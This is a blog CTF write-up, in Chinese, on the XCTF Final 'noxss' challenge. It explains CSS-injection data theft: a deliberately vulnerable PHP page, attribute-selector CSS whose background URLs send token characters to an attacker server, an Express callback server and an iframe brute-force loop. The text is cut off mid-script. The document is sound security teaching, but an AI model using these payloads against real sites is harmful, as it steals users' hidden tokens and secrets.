<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来&amp;hellip;赛后问了一下，主要还是差了一篇文章 Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也正是之前 noxss 2017 的解法。
"><title>XCTF Final NOXSS Write Up</title>
<link rel=canonical href=https://blog.zeddyu.info/2019/11/21/XCTF-Final-noxss/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="XCTF Final NOXSS Write Up">
<meta property="og:description" content="这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来&amp;hellip;赛后问了一下，主要还是差了一篇文章 Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也正是之前 noxss 2017 的解法。
">
<meta property="og:url" content="https://blog.zeddyu.info/2019/11/21/XCTF-Final-noxss/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2019-11-21T00:37:14+00:00"><meta property="article:modified_time" content="2019-11-21T00:37:14+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="XCTF Final NOXSS Write Up">
<meta name=twitter:description content="这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来&amp;hellip;赛后问了一下，主要还是差了一篇文章 Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也正是之前 noxss 2017 的解法。
">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2019/11/21/XCTF-Final-noxss/>XCTF Final NOXSS Write Up</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Nov 21, 2019</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
15 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>这是本次比赛做起来最有跪感的一题了，当时比赛的时候怎么都弄不出来&mldr;赛后问了一下，主要还是差了一篇文章 <a class=link href=https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/ target=_blank rel=noopener>Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację</a>，这个标题是个波兰语，中文翻译过来就是使用 CSS 攻击 Web 应用程序，从文章内容也看到了 RPO 的攻击引述，也正是之前 noxss 2017 的解法。</p>
<p>[TOC]</p>
<h1 id=preparation>Preparation</h1>
<p><strong>所做的实验测试均在 Chrome 78.0.3904.97 版本上</strong>，Firefox 有一些场景未测试成功。</p>
<p>我们需要的有 fontforge / nodejs / npm|yarn ，安装 <a class=link href=http://designwithfontforge.com/en-US/Installing_Fontforge.html target=_blank rel=noopener>fontforge on ubuntu</a>，安装 <a class=link href=https://stackoverflow.com/questions/41195952/updating-nodejs-on-ubuntu-16-04 target=_blank rel=noopener>nodejs on ubuntu</a></p>
<h2 id=intro>INTRO</h2>
<p>在我们看题之前，我们先来看看一些简化的情况</p>
<p>首先创建一个 css.php ，内容如下：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;!</span><span class=nx>DOCTYPE</span> <span class=nx>html</span><span class=o>&gt;</span>
<span class=o>&lt;</span><span class=nx>html</span> <span class=nx>lang</span><span class=o>=</span><span class=s2>&#34;en&#34;</span><span class=o>&gt;</span>
<span class=o>&lt;</span><span class=nx>head</span><span class=o>&gt;</span>
    <span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>charset</span><span class=o>=</span><span class=s2>&#34;UTF-8&#34;</span><span class=o>&gt;</span>
    <span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>name</span><span class=o>=</span><span class=s2>&#34;viewport&#34;</span> <span class=nx>content</span><span class=o>=</span><span class=s2>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=o>&gt;</span>
    <span class=o>&lt;</span><span class=nx>meta</span> <span class=nx>http</span><span class=o>-</span><span class=nx>equiv</span><span class=o>=</span><span class=s2>&#34;X-UA-Compatible&#34;</span> <span class=nx>content</span><span class=o>=</span><span class=s2>&#34;ie=edge&#34;</span><span class=o>&gt;</span>
    <span class=o>&lt;</span><span class=nx>title</span><span class=o>&gt;</span><span class=nx>Document</span><span class=o>&lt;/</span><span class=nx>title</span><span class=o>&gt;</span>
<span class=o>&lt;/</span><span class=nx>head</span><span class=o>&gt;</span>
<span class=o>&lt;</span><span class=nx>body</span><span class=o>&gt;</span>
<span class=o>&lt;?</span><span class=nx>php</span>
<span class=nv>$token1</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_USER_AGENT&#39;</span><span class=p>]);</span>
<span class=nv>$token2</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$token1</span><span class=p>);</span>
<span class=cp>?&gt;</span><span class=err>
</span><span class=err>&lt;input type=hidden value=&lt;?=$token1 ?&gt;&gt;
</span><span class=err>&lt;script&gt;
</span><span class=err>	var TOKEN = &#34;&lt;?=$token2 ?&gt;&#34;;
</span><span class=err>&lt;/script&gt;
</span><span class=err>
</span><span class=err>&lt;style&gt;
</span><span class=err>	&lt;?=preg_replace(&#39;#&lt;/style#i&#39;, &#39;#&#39;, $_GET[&#39;css&#39;]) ?&gt;
</span><span class=err>&lt;/style&gt;
</span><span class=err>&lt;/body&gt;
</span><span class=err>&lt;/html&gt;
</span></code></pre></div><p>这段代码也比较简单，input 标签与 script 标签内均有一个 token ，我们需要使用传入 css 参数来获取这两个 token</p>
<h3 id=token1---get-from-input>Token1 - Get From Input</h3>
<p>首先我们来尝试去获取第一个 token1 ，也就是在 input 标签内的 value 属性值，我们可控的只有 css 参数，所以我们只能去尝试构造 css 来获取 input 标签内的 value 属性值。</p>
<p>在 css 当中我们可以使用 css 选择器来选择我们的标签元素，例如</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=c>/* 设置 body 标签元素 */</span>
<span class=nt>body</span> <span class=p>{</span> <span class=p>}</span>
 
<span class=c>/* 设置 .test class 的样式 */</span>
<span class=p>.</span><span class=nc>test</span> <span class=p>{</span> <span class=p>}</span>
 
<span class=c>/* 设置 id 为 test2 的样式 */</span>
<span class=p>#</span><span class=nn>test2</span> <span class=p>{</span> <span class=p>}</span>
 
<span class=c>/* 设置 value 为 abc 的 input 标签的样式 */</span>
<span class=nt>input</span><span class=o>[</span><span class=nt>value</span><span class=o>=</span><span class=s2>&#34;abc&#34;</span><span class=o>]</span> <span class=p>{</span> <span class=p>}</span>
 
<span class=c>/* 设置 value 为 a 开头的 input 标签的样式 */</span>
<span class=nt>input</span><span class=o>[</span><span class=nt>value</span><span class=o>^=</span><span class=s2>&#34;a&#34;</span><span class=o>]</span> <span class=p>{</span> <span class=p>}</span>
</code></pre></div><p>我们可以看到在 css 选择器当中，我们可以设置类似<code>value^="a"</code>这样的选择器来获取我们的元素，所以这里我们大概可以有这么一个操作:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=cp>&lt;!DOCTYPE html&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Document<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>hidden</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;7b8a45b8297cf82cc3cefc174c3ae5a1&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span>
        <span class=nt>input</span><span class=o>[</span><span class=nt>value</span><span class=o>^=</span><span class=s2>&#34;0&#34;</span><span class=o>]</span> <span class=p>{</span>
            <span class=k>background</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>http://127.0.0.1:9999/0</span><span class=p>);</span>
        <span class=p>}</span>
        
        <span class=nt>input</span><span class=o>[</span><span class=nt>value</span><span class=o>^=</span><span class=s2>&#34;7&#34;</span><span class=o>]</span> <span class=p>{</span>
            <span class=k>background</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=sx>http://127.0.0.1:9999/7</span><span class=p>);</span>
        <span class=p>}</span>
    <span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119004834.png><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191119004834.png loading=lazy>
</a>
</figure></p>
<p>可以看到我们这里收到了<code>value^="7"</code>选择器发来的请求，所以我们也可以i使用枚举思想来进行爆破获取 token1</p>
<h3 id=token1---auto-get-from-input>Token1 - Auto Get From Input</h3>
<p>剩下的就是要思考我们要如何去构造自动化工具去获取这个 token1 了，这里自动化的难点就在于如何获取爆破的时候是哪个字符正确了而发起了请求，无法拿到这个 callback 我们也就没有依据判断究竟是哪个字符注入正确了而发起了请求。</p>
<p>原文是采取了使用 cookie 的方式来进行这个 callback 的过程：</p>
<ul>
<li>在服务器上放置一个有 iframe 页面 index.html ，src 为要注入的页面 css</li>
<li>建立一个服务供接受注入字符发来的请求，并且服务通过设置一个 cookie 来响应这个请求</li>
<li>index.html 根据 cookie 来进行判断注入的字符是否正确，正确的话就使用变量进行存储然后接着下一位的爆破</li>
</ul>
<p>我们在服务端就需要提供这么些功能，所以我们可以构造这么个服务，用<code>npm install</code>或者<code>yarn</code>以下面这个 package.json 构建</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=p>{</span>
  <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;css-attack-1&#34;</span><span class=p>,</span>
  <span class=nt>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;1.0.0&#34;</span><span class=p>,</span>
  <span class=nt>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
  <span class=nt>&#34;main&#34;</span><span class=p>:</span> <span class=s2>&#34;index.js&#34;</span><span class=p>,</span>
  <span class=nt>&#34;dependencies&#34;</span><span class=p>:</span> <span class=p>{</span>
    <span class=nt>&#34;express&#34;</span><span class=p>:</span> <span class=s2>&#34;^4.15.5&#34;</span><span class=p>,</span>
    <span class=nt>&#34;js-cookie&#34;</span><span class=p>:</span> <span class=s2>&#34;^2.1.4&#34;</span>
  <span class=p>},</span>
  <span class=nt>&#34;devDependencies&#34;</span><span class=p>:</span> <span class=p>{},</span>
  <span class=nt>&#34;author&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
  <span class=nt>&#34;license&#34;</span><span class=p>:</span> <span class=s2>&#34;ISC&#34;</span>
<span class=p>}</span>
</code></pre></div><p>以及相应的服务代码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>);</span>
<span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>disable</span><span class=p>(</span><span class=s1>&#39;etag&#39;</span><span class=p>);</span>

<span class=kr>const</span> <span class=nx>PORT</span> <span class=o>=</span> <span class=mi>3000</span><span class=p>;</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/token/:token&#39;</span><span class=p>,(</span><span class=nx>req</span><span class=p>,</span><span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=kr>const</span> <span class=p>{</span> <span class=nx>token</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>;</span> <span class=c1>//var {a} = {a:1, b:2}; =&gt; var obj = {a:1, b:2};var a = obj.a;
</span><span class=c1></span>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>token</span><span class=p>);</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>cookie</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>,</span><span class=nx>token</span><span class=p>);</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/cookie.js&#39;</span><span class=p>,(</span><span class=nx>req</span><span class=p>,</span><span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=s1>&#39;js.cookie.js&#39;</span><span class=p>,{</span>
        <span class=nx>root</span><span class=o>:</span> <span class=s1>&#39;./node_modules/js-cookie/src/&#39;</span>
    <span class=p>});</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/index.html&#39;</span><span class=p>,(</span><span class=nx>req</span><span class=p>,</span><span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,{</span>
        <span class=nx>root</span><span class=o>:</span> <span class=s1>&#39;.&#39;</span>
    <span class=p>});</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>PORT</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`Listening on </span><span class=si>${</span><span class=nx>PORT</span><span class=si>}</span><span class=sb>...`</span><span class=p>);</span>
<span class=p>});</span>
</code></pre></div><p>然后使用<code>node index.js</code>跑起来就行了。</p>
<p>整个流程大致是如下一个流程：</p>
<ol>
<li>如果我们目前提取的 token 长度小于预期的长度，则我们执行以下操作</li>
<li>删除包含所有先前提取数据的 cookie</li>
<li>创建一个 iframe 标签，并 src 指向我们构造好的字符爆破的页面。</li>
<li>我们一直等到自己的服务 callback 为爆破请求设置含有 token 的 cookie</li>
<li>设置 cookie 后，我们将其设置为当前的已知 token 值，并返回到步骤1</li>
</ol>
<p>所以我们可以有大致以下框架：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>big</span> <span class=na>id</span><span class=o>=</span><span class=s>token</span><span class=p>&gt;&lt;/</span><span class=nt>big</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>id</span><span class=o>=</span><span class=s>iframe</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
  <span class=p>(</span><span class=kr>async</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
    <span class=kr>const</span> <span class=nx>EXPECTED_TOKEN_LENGTH</span> <span class=o>=</span> <span class=mi>32</span><span class=p>;</span>
    <span class=kr>const</span> <span class=nx>ALPHABET</span> <span class=o>=</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>from</span><span class=p>(</span><span class=s2>&#34;0123456789abcdef&#34;</span><span class=p>);</span>
    <span class=kr>const</span> <span class=nx>iframe</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>
    <span class=kd>let</span> <span class=nx>extractedToken</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>

    <span class=k>while</span> <span class=p>(</span><span class=nx>extractedToken</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=nx>EXPECTED_TOKEN_LENGTH</span><span class=p>)</span> <span class=p>{</span>
      <span class=nx>clearTokenCookie</span><span class=p>();</span>
      <span class=nx>createIframeWithCss</span><span class=p>();</span>
      <span class=nx>extractedToken</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>getTokenFromCookie</span><span class=p>();</span>
      <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=nx>extractedToken</span><span class=p>;</span>
    <span class=p>}</span>
  <span class=p>})();</span>
<span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</code></pre></div><p>首先我们可以直接使用 <a class=link href=https://github.com/js-cookie/js-cookie target=_blank rel=noopener>js-cookie</a> 这个项目来直接清除 cookie</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kd>function</span> <span class=nx>clearTokenCookie</span><span class=p>()</span> <span class=p>{</span>
    <span class=nx>Cookies</span><span class=p>.</span><span class=nx>remove</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>);</span>
<span class=p>}</span>
</code></pre></div><p>接下来，我们需要为 <code>iframe</code> 标签构造注入的页面 URL :</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kd>function</span> <span class=nx>createIframeWithCss</span><span class=p>()</span> <span class=p>{</span>
  <span class=nx>iframe</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s1>&#39;http://127.0.0.1/css.php?css=&#39;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>generateCSS</span><span class=p>());</span>
<span class=p>}</span>
</code></pre></div><p>以及生成 css 的函数：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kd>function</span> <span class=nx>generateCSS</span><span class=p>()</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>css</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
  <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=kr>char</span> <span class=k>of</span> <span class=nx>ALPHABET</span><span class=p>)</span> <span class=p>{</span>
    <span class=nx>css</span> <span class=o>+=</span> <span class=sb>`input[value^=&#34;</span><span class=si>${</span><span class=nx>extractedToken</span><span class=si>}${</span><span class=kr>char</span><span class=si>}</span><span class=sb>&#34;] {
</span><span class=sb>background: url(http://127.0.0.1:3000/token/</span><span class=si>${</span><span class=nx>extractedToken</span><span class=si>}${</span><span class=kr>char</span><span class=si>}</span><span class=sb>)
</span><span class=sb>}`</span><span class=p>;</span>
  <span class=p>}</span>
  <span class=k>return</span> <span class=nx>css</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p>最后我们需要实现通过等待反向连接来设置 cookie ，用 JS 中的 <code>Promise</code> 机制来构建异步函数，每隔50毫秒检查一次 cookie 是否已设置，如果已设置，该函数将立即返回该值。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kd>function</span> <span class=nx>getTokenFromCookie</span><span class=p>()</span> <span class=p>{</span>
    <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
        <span class=kr>const</span> <span class=nx>interval</span> <span class=o>=</span> <span class=nx>setInterval</span><span class=p>(</span><span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
            <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=nx>Cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>);</span>
            <span class=k>if</span> <span class=p>(</span><span class=nx>token</span><span class=p>)</span> <span class=p>{</span>
                <span class=nx>clearInterval</span><span class=p>(</span><span class=nx>interval</span><span class=p>);</span>
                <span class=nx>resolve</span><span class=p>(</span><span class=nx>token</span><span class=p>);</span>
            <span class=p>}</span>
        <span class=p>},</span> <span class=mi>50</span><span class=p>);</span>
    <span class=p>});</span>
<span class=p>}</span>
</code></pre></div><p>最后整合起来的攻击方式是这样的：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=cp>&lt;!DOCTYPE html&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Document<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>

<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>script</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://127.0.0.1:3000/cookie.js&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>big</span> <span class=na>id</span><span class=o>=</span><span class=s>token</span><span class=p>&gt;&lt;/</span><span class=nt>big</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>id</span><span class=o>=</span><span class=s>iframe</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
        <span class=p>(</span><span class=kr>async</span> <span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
            <span class=kr>const</span> <span class=nx>EXPECTED_TOKEN_LENGTH</span> <span class=o>=</span> <span class=mi>32</span><span class=p>;</span>
            <span class=kr>const</span> <span class=nx>ALPHABET</span> <span class=o>=</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>from</span><span class=p>(</span><span class=s2>&#34;0123456789abcdef&#34;</span><span class=p>);</span>
            <span class=kr>const</span> <span class=nx>iframe</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;iframe&#39;</span><span class=p>);</span>
            <span class=kd>let</span> <span class=nx>extractedToken</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>

            <span class=k>while</span> <span class=p>(</span><span class=nx>extractedToken</span><span class=p>.</span><span class=nx>length</span> <span class=o>&lt;</span> <span class=nx>EXPECTED_TOKEN_LENGTH</span><span class=p>)</span> <span class=p>{</span>
                <span class=nx>clearTokenCookie</span><span class=p>();</span>
                <span class=nx>createIframeWithCss</span><span class=p>();</span>
                <span class=nx>extractedToken</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>getTokenFromCookie</span><span class=p>();</span>

                <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>).</span><span class=nx>textContent</span> <span class=o>=</span> <span class=nx>extractedToken</span><span class=p>;</span>
            <span class=p>}</span>

            <span class=kd>function</span> <span class=nx>getTokenFromCookie</span><span class=p>()</span> <span class=p>{</span>
                <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
                    <span class=kr>const</span> <span class=nx>interval</span> <span class=o>=</span> <span class=nx>setInterval</span><span class=p>(</span><span class=kd>function</span> <span class=p>()</span> <span class=p>{</span>
                        <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=nx>Cookies</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>);</span>
                        <span class=k>if</span> <span class=p>(</span><span class=nx>token</span><span class=p>)</span> <span class=p>{</span>
                            <span class=nx>clearInterval</span><span class=p>(</span><span class=nx>interval</span><span class=p>);</span>
                            <span class=nx>resolve</span><span class=p>(</span><span class=nx>token</span><span class=p>);</span>
                        <span class=p>}</span>
                    <span class=p>},</span> <span class=mi>50</span><span class=p>);</span>
                <span class=p>});</span>
            <span class=p>}</span>

            <span class=kd>function</span> <span class=nx>clearTokenCookie</span><span class=p>()</span> <span class=p>{</span>
                <span class=nx>Cookies</span><span class=p>.</span><span class=nx>remove</span><span class=p>(</span><span class=s1>&#39;token&#39;</span><span class=p>);</span>
            <span class=p>}</span>

            <span class=kd>function</span> <span class=nx>generateCSS</span><span class=p>()</span> <span class=p>{</span>
                <span class=kd>let</span> <span class=nx>css</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
                <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=kr>char</span> <span class=k>of</span> <span class=nx>ALPHABET</span><span class=p>)</span> <span class=p>{</span>
                    <span class=nx>css</span> <span class=o>+=</span> <span class=sb>`input[value^=&#34;</span><span class=si>${</span><span class=nx>extractedToken</span><span class=si>}${</span><span class=kr>char</span><span class=si>}</span><span class=sb>&#34;] {
